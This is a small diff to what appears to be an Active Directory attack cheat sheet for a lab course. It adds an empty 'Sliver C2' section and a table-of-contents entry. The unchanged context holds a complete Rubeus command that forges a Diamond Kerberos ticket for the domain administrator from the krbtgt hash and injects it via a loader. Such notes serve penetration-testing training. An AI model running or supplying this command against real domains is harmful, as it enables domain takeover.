@@ -59,6 +59,7 @@
 - <<av, AV evasion>>
 - <<trust, Domain Trusts>>
 - <<tickets,Golden,Silver,Diamond tickets generation>>
+- <<sliver, SLiver C2>>
 
 
 [[overview]]
@@ -2082,6 +2083,9 @@ Diamond
 ```bash
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:krbtgt_hash /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
+
+[[sliver]]
+== Sliver C2
 
 
 
